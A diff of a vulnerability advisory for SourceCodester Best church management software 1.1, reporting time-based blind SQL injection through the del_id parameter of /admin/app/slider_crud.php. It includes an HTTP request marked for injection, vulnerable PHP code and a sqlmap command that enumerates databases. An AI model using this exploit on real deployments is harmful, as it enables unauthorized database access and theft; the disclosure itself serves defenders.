@@ -1,9 +1,9 @@
 # Code Source
 https://www.sourcecodester.com/php/17856/best-church-management-software-free-download-full-version.html
 # Description
-A vulnerability has been found in SourceCodester Best church management software 1.1 and classified as critical. SourceCodester Best church management software 1.1 has a SQL Injection vulnerability in /admin/app/slider_crud.php. Affected is file /admin/app/slider_crud.php,The manipulation of the argument del_id leads to SQL inject. Remote attackers can leverage time-based blind SQL injection to extract data from the database.
+A vulnerability has been found in SourceCodester Best church management software 1.1 and classified as critical. SourceCodester Best church management software 1.1 has a SQL Injection vulnerability in /admin/app/slider_crud.php. Affected is file /admin/app/slider_crud.php,The manipulation of the argument `del_id` leads to SQL inject. Remote attackers can leverage time-based blind SQL injection to extract data from the database.
 
-# Request：
+# Request
 ```
 POST /admin/app/slider_crud.php HTTP/1.1
 Host: 127.0.0.1
@@ -25,7 +25,7 @@ Priority: u=0, i
 del_id=*
 ```
 
-# Affect code:
+# Affect code
 ```php
 ... ...
 if (isset($_POST['del_id'])) 
@@ -38,8 +38,8 @@ if (isset($_POST['del_id']))
 ... ...
 ```
 
-# Exploit:
-`python sqlmap.py -r 2.txt --dbs`
+# Exploit
+`python sqlmap.py -r 1.txt --dbs`
 ![图片](https://github.com/user-attachments/assets/a4a1f8b1-6ce1-4eef-8828-b7b3067a16fc)
 ![图片](https://github.com/user-attachments/assets/eb26ff3a-19a4-4f4e-acb1-cf3c936fa840)
 
